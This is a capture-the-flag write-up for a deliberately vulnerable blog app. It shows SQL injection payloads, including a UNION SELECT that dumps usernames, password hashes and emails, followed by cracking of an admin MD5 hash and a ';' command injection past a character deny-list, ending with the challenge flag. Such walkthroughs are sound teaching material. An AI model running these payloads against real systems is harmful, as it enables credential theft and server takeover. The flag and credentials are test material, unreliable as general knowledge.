## Weblog

Author: @HuskyHacks

Web-LOG? We-BLOG? Webel-OGG? No idea how this one is pronounced. It's on the web, it's a log, it's a web-log, it's a blog. Just roll with it.


![image 2](https://github.com/user-attachments/assets/306a5aae-1f5e-434d-92ca-078c2c1dab46)


![image 3](https://github.com/user-attachments/assets/80872514-903a-41b9-a191-247e80f8857d)

## **SQL Injection in `/search`**

![image 4](https://github.com/user-attachments/assets/6ac31afa-1360-4a3c-8282-fdc9e09e286f)


### **Identifying SQL Injection**

In the source code (`search.py`), the **search feature** was vulnerable to SQL injection:

```python
query = request.args.get("q", "")
raw_query = text(f"SELECT * FROM blog_posts WHERE title LIKE '%{query}%'")
posts = db.session.execute(raw_query).fetchall()
```

 **Vulnerability:**

- User input (`query`) is **directly concatenated** into the SQL query.
- No **parameterized queries** are used, making it vulnerable to SQL injection.

### **Exploiting SQL Injection**

I tested for SQL injection by searching:

```
' OR '1'='1
```

This payload modified the query to:

```sql
SELECT * FROM blog_posts WHERE title LIKE '%' OR '1'='1'
```

**Result:** It **retrieved all blog posts**, confirming SQL injection.

---

## **Extracting User Credentials**

After confirming SQL injection, I attempted to **extract user credentials** from the `users` table.

### **Finding the Correct Column Count**

When running:

```
' UNION SELECT username, password FROM users --
```

I got:

![image 5](https://github.com/user-attachments/assets/9b82a4ee-fdc3-4ea2-bd94-1562ed9fc3bb)


**Cause:** The number of columns in `blog_posts` and `users` did not match.

I used an **ORDER BY trick** to determine the correct column count:

```sql
' ORDER BY 1 --
' ORDER BY 2 --
...
' ORDER BY 6 --  (This caused an error)
```

**Conclusion:** The `blog_posts` table had **5 columns**.

### **Analyzing the Column Data Types**

I examined the `blog_posts` table structure:

```sql
sql
CopyEdit
CREATE TABLE blog_posts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    title VARCHAR(255),
    content TEXT,
    author VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

From this, I determined the **expected data types**:

1. `id` (Integer - INT)
2. `title` (String - VARCHAR)
3. `content` (Text - TEXT)
4. `author` (String - VARCHAR)
5. `created_at` (Timestamp - TIMESTAMP)

---

### **SQL Injection**

I adjusted my payload to **match the expected data types**:

```sql
' UNION SELECT 1, "test", "test", "test", NOW() --
```

📌 **Breakdown of Fix:**

- `1` → **Integer (id)**
- `"test"` → **String (title)**
- `"test"` → **Text (content)**
- `"test"` → **String (author)**
- `NOW()` → **Timestamp (created_at)**

**This payload executed successfully**, confirming the correct column count and data types.


![image 6](https://github.com/user-attachments/assets/0f8c3dd9-e3c9-4bf1-85af-e119b596ee28)

---

### **Extracting User Credentials**

Now that I had a **working UNION SELECT payload**, I refined it to extract user credentials:

```sql
' UNION SELECT 1, username, password, email, "2025-01-01 00:00:00" FROM users -- 
```

**Result:** This payload successfully retrieved **admin credentials** from the `users` table.

![image 7](https://github.com/user-attachments/assets/5c1bee3a-3745-4368-bfdf-3bf2594e6b1f)

![image 8](https://github.com/user-attachments/assets/4212ac3e-67d1-4cee-a857-d7f6fee3ed88)

---

**Step 4: Cracking the Admin Password**

One of the extracted users was:

```
admin - c1b8b03c5a1b6d4dcec9a852f85cac59
```

This **looked like an MD5 hash**, so I tried **cracking it**

```
c1b8b03c5a1b6d4dcec9a852f85cac59 → no1trust
```

**Admin Credentials:**

```
Username: admin
Password: no1trust
```

I then **logged in as the admin**.

---

## **Exploiting Command Injection in Admin Panel**

![image 9](https://github.com/user-attachments/assets/4cd378d9-c6aa-4cd0-8755-84415b93c730)


After logging in, I accessed the **Admin Panel (`/admin`)**.

The `admin.py` file contained:

```python
DEFAULT_COMMAND = "echo 'Rebuilding database...' && /entrypoint.sh"

DISALLOWED_CHARS = r"[&|><$\\]"
...
if not command.startswith(DEFAULT_COMMAND):
    error_message = "Invalid command: does not start with the default operation."
elif re.search(DISALLOWED_CHARS, command[len(DEFAULT_COMMAND):]):
    error_message = "Invalid command: contains disallowed characters."
```

**Vulnerability:**

- The app **checks if commands start with** `"echo 'Rebuilding database...' && /entrypoint.sh"`.
- It **blocks** certain characters: `& | > < $ \`, but **`;` (command separator) is not blocked**.

### **Command Injection Payload**

To execute system commands, I crafted

```bash
echo 'Rebuilding database...' && /entrypoint.sh; ls -la
```

**Result:** It listed all files, revealing `flag.txt`!

---

## **Capturing the Flag**

Since I now had command execution, I used:

```bash
echo 'Rebuilding database...' && /entrypoint.sh; cat flag.txt
```

**Final Flag:**

![5bcf3558-1f72-43bd-84eb-71de9606aa09](https://github.com/user-attachments/assets/f0cf27a3-abc8-46c3-a055-a9d0804028d6)

flag{b06fbe98752ab13d0fb8414fb55940f3}
